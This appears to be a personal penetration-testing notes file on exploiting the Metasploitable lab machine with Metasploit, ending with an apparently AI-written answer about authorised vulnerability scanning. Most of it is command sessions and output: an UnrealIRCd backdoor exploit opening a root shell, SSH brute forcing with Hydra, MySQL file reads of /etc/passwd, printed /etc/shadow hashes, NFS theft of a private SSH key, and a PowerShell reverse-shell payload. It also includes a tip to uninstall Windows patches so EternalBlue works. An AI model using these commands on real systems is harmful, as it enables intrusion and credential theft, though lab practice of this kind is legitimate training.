- [ssh Brute-Force](https://pentest.tonyng.net/metasploitable-ssh-exploits/)
- [MySQL 4 usernames + Hydra](https://charlesreid1.com/wiki/Metasploitable/SSH/Brute_Force)
- [Backdoor](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
- [RPC Console Command Execution](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/multi/misc/msf_rpc_console)

## Examples

```sh
# search payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > search type:exploit platform:windows target:2008 smb

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank     Check  Description
   -  ----                                                    ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index  2009-09-07       good     No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference 
   1  exploit/windows/smb/ms17_010_eternalblue                2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/smb/ms17_010_eternalblue
```

```sh
┌──(root㉿docker-desktop)-[/app/collections/vulnerability.scan]
└─# telnet 192.168.0.14 135
Trying 192.168.0.14...
Connected to 192.168.0.14.
Escape character is '^]'.


$ msfconsole
 
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf  exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.99.131
msf  exploit(unreal_ircd_3281_backdoor) > exploit
 
[*] Started reverse double handler
[*] Connected to 192.168.99.131:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 8bMUYsfmGvOLHBxe;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "8bMUYsfmGvOLHBxe\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.99.128:4444 -> 192.168.99.131:60257) at 2012-05-31 21:53:59 -0700

                       
id
uid=0(root) gid=0(root)


root@ubuntu:~# telnet 192.168.99.131 1524
Trying 192.168.99.131...
Connected to 192.168.99.131.
Escape character is '^]'.
root@metasploitable:/# id
uid=0(root) gid=0(root) groups=0(root)
```

- ssh login, brute.force

```sh
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.0.0.27
msf6 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /app/passwords
/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set VERBOSE false
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] Starting interaction with 1...

id
uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Wed Apr 10 12:02:00 UTC 2014 i686 GNU/Linux '

msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
# service rpcbind start
# mkdir /tmp/target
# mount -t nfs 10.0.0.27:/ /temp/target
# cp /tmp/target/home/msfadmin/.ssh/id_rsa /tmp/r00tprivatekey
# umount /tmp/target
```

- mysql 2 usernames

```sh
msf > use auxiliary/admin/mysql/mysql_sql
msf auxiliary(mysql_sql) > set USERNAME root
USERNAME => root
msf auxiliary(mysql_sql) > set PASSWORD ''
PASSWORD =>
msf auxiliary(mysql_sql) > set RHOST 10.0.0.27
RHOST => 10.0.0.27

# /etc/passwd
msf auxiliary(mysql_sql) > set SQL select load_file(\'/etc/passwd\')
SQL => select load_file('/etc/passwd')
msf auxiliary(mysql_sql) > run

[*] Sending statement: 'select load_file('/etc/passwd')'...
[*]  | root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
 |
[*] Auxiliary module execution completed

# Reading /etc/shadow
# , which contains password hashes
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::

# Edit users_file
root@morpheus:~# cat users_file
root
sys
klog
msfadmin
postgres
user
service

# use hydra to brute force ssh
# hydra -L users_file -P 500-worst-passwords.txt ssh://10.0.0.27:22
Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-03-25 21:45:13
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 4 tasks per 1 server, overall 64 tasks, 3549 login tries (l:7/p:507), ~13 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 3505 todo in 01:20h, 4 active
```

- 135/tcp  open  msrpc

```sh
  msf > use exploit/multi/misc/msf_rpc_console 
  msf exploit(msf_rpc_console) > set rhost 172.16.191.166
  rhost => 172.16.191.166
  msf exploit(msf_rpc_console) > set username msf
  username => msf
  msf exploit(msf_rpc_console) > set password abc123
  password => abc123
  msf exploit(msf_rpc_console) > set lhost 172.16.191.181
  lhost => 172.16.191.181
  msf exploit(msf_rpc_console) > set target 0
  target => 1
  msf exploit(msf_rpc_console) > set payload cmd/windows/powershell_reverse_tcp 
  payload => cmd/windows/powershell_reverse_tcp
  msf exploit(msf_rpc_console) > run

  [*] Started reverse SSL handler on 172.16.191.181:4444 
  [+] 172.16.191.166:55552 - Authenticated successfully
  [*] 172.16.191.166:55552 - Metasploit 4.14.28-dev
  [*] 172.16.191.166:55552 - Ruby 2.3.3 x64-mingw32 2016-11-21
  [*] 172.16.191.166:55552 - API version 1.0
  [+] 172.16.191.166:55552 - Created console #1
  [*] 172.16.191.166:55552 - Sending payload...
  [*] Powershell session session 2 opened (172.16.191.181:4444 -> 172.16.191.166:52996) at 2017-07-05 03:44:05 -0400

  Windows PowerShell running as user user on WIN-SGBSD5TQUTQ
  Copyright (C) 2015 Microsoft Corporation. All rights reserved.

  PS C:\metasploit>whoami
  win-sgbsd5tqutq\user
```

## Logs

```sh
$ msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
with set RHOSTS x.x.x.x

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v6.3.37-dev-                         ]
+ -- --=[ 2364 exploits - 1228 auxiliary - 413 post       ]
+ -- --=[ 1388 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/



msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.0.6
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[-] 192.168.0.6:445       - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 192.168.0.6:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```sh
# https://github.com/rapid7/metasploit-framework/issues/11691

# Ok so if anyone is still facing the error: (Tested on Windows server 2012 r2)
# -First run this script on the target machine to know whether it is vulnerable to eternalblue
# If the machine is not vulnerable, then it is patched, therefore remove all windows KB update/patch superior to '401..'
#  > wusa /uninstall /kb:5003209
# -Next if the script says that the machine is vulnerable but you still facing this issue, then open group policy editor
# > gpedit.msc
# Go to Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options
# edit 'Network access: Shares that can be accessed anonymously' and add " \ " to the empty list
```

```sh
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting    Required  Description
   ----         ---------------    --------  -----------
   CHECK_ARCH   true               no        Check for architecture on v  
                                             ulnerable hosts
   CHECK_DOPU   true               no        Check for DOUBLEPULSAR on v  
                                             ulnerable hosts
   CHECK_PIPE   false              no        Check for named pipe on vul  
                                             nerable hosts
   NAMED_PIPES  /opt/metasploit-f  yes       List of named pipes to chec  
                ramework/embedded            k
                /framework/data/w
                ordlists/named_pi
                pes.txt
   RHOSTS       192.168.0.6        yes       The target host(s), see htt  
                                             ps://docs.metasploit.com/do  
                                             cs/using-metasploit/basics/  
                                             using-metasploit.html        
   RPORT        445                yes       The SMB service port (TCP)   
   SMBDomain    .                  no        The Windows domain to use f  
                                             or authentication
   SMBPass                         no        The password for the specif  
                                             ied username
   SMBUser                         no        The username to authenticat  
                                             e as
   THREADS      1                  yes       The number of concurrent th  
                                             reads (max one per host)     


View the full module info with the info, or info -d command.
```

```sh

```

## how to check if my windows server is secure using automatic test with metasploit. any simple way - one command or so

Metasploit provides a set of security assessment and penetration testing tools that can be used to check the security of a Windows server. While Metasploit is a powerful framework, it's important to note that using it to automatically test your own systems without proper authorization is unethical and potentially illegal. Therefore, you should only use Metasploit to test systems that you have explicit permission to assess.

Here's a simplified example of how you can use Metasploit to perform a basic vulnerability assessment on your Windows server:

Note: Replace <target_ip> with the IP address of your Windows server.

Open Metasploit Framework:

Start by opening Metasploit. Depending on your installation, you can typically run it by executing the msfconsole command.

Search for Vulnerability Scanning Modules:

Use the search command to search for available vulnerability scanning modules. These modules are used to check for known vulnerabilities on a target system. For example:

```sh
search vulnerability
```

Select and Configure a Module:

Choose a vulnerability scanning module that suits your needs. For example, you can use the auxiliary/scanner/smb/smb_ms17_010 module to check for the MS17-010 vulnerability (EternalBlue) that affected Windows systems.

```sh
use auxiliary/scanner/smb/smb_ms17_010
```

Set the Target IP Address:

Set the RHOSTS option to the IP address of your Windows server:
```sh
set RHOSTS <target_ip>
```
Run the Module:

Execute the module by running the exploit command:

```sh
exploit
```

The module will attempt to check if the MS17-010 vulnerability exists on the target system.

Review the Results:

Metasploit will display the results of the vulnerability scan. It will indicate whether the target is vulnerable or not.

Please note that this is just a simple example, and Metasploit offers a wide range of modules for various security assessments and penetration testing tasks. Additionally, Metasploit should be used responsibly, and you should always have proper authorization to perform any testing on systems you don't own.

It's important to mention that vulnerability scanning should be part of a broader security assessment strategy, which may include manual testing, patch management, and other security measures.
